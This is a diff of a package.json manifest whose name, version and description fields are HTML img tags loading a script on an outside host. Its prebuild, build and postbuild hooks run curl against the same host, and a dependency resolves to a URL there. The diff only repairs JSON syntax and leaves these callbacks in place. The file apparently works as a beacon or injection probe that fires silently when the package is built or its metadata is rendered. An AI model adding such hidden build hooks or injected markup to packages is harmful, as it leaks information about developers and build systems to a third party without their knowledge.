@@ -2,13 +2,13 @@
   "name": "<img src=\"https://wszostak.pl/x/s.php?name\">",
   "version": "<img src=\"https://wszostak.pl/x/s.php?version\">",
   "description": "<img src=\"https://wszostak.pl/x/s.php?description\">",
-  "scripts": {
+   "scripts": {
     "prebuild": "curl https://wszostak.pl/x/s.php?npm-prb",
     "build": "curl https://wszostak.pl/x/s.php?npm-b",
     "postbuild": "curl https://wszostak.pl/x/s.php?npm-pob"
   },
-  {
-    "dependencies" :
-    { "wszostak" : "https://wszostak.pl/x/s.php?dep"}
+
+  "dependencies" : { 
+    "wszostak" : "https://wszostak.pl/x/s.php?dep"
   }
 }
